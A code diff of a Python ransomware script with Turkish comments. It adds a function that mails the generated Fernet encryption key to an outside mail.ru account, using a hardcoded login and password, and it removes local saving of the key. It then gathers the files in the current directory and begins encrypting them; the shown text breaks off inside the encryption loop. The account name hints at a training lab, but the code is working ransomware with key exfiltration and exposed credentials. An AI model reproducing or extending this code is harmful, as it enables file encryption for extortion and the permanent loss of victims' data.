@@ -1,22 +1,36 @@
 import os 
 from cryptography.fernet import Fernet
+import smtplib
+
+# Gerekli modülleri içe aktarıyoruz.
+
+def mail_sender(mail, password, message):
+    # E-posta gönderme fonksiyonunu tanımlıyoruz.
+    email_server = smtplib.SMTP('smtp.mail.ru', 587)
+    email_server.starttls()  # Güvenli bağlantı başlatma
+    email_server.login(mail, password)  # E-posta hesabına giriş yapma
+    email_server.sendmail(mail, mail, message)  # E-posta gönderme
+    email_server.quit()  # E-posta sunucusu bağlantısını kapatma
 
 file_list = []
 
 for file in os.listdir():
-	if file == 'ransomware.py' or file == 'ransomdecrypter.py' or file == 'desktop.ini' or file == 'generated.key':
-		continue
-	if os.path.isfile(file):
-		file_list.append(file)
+    # Mevcut dizindeki dosyaları listeleyerek dönüyoruz.
+    if file == 'ransomware.py' or file == 'desktop.ini':
+        continue  # Belirtilen dosyaları atlayarak geçiyoruz.
+    if os.path.isfile(file):
+        file_list.append(file)  # Dosyaları listeye ekliyoruz.
 
-print(file_list)
 
 key = Fernet.generate_key()
+# Fernet kullanarak yeni bir anahtar oluşturuyoruz.
 
-print(key)
 
-with open('generated.key', 'wb') as generatedkey:
-	generatedkey.write(key)
+mail_sender('rastgeletryhackme@mail.ru','AWzaqhu1iqpuHDequaEd',key)
+
+# with open('generated.key', 'wb') as generatedkey:
+#     generatedkey.write(key)
+# Oluşturulan anahtarı 'generated.key' adlı bir dosyaya yazıyoruz.
 
 for file in file_list:
 	with open(file,'rb') as the_file:
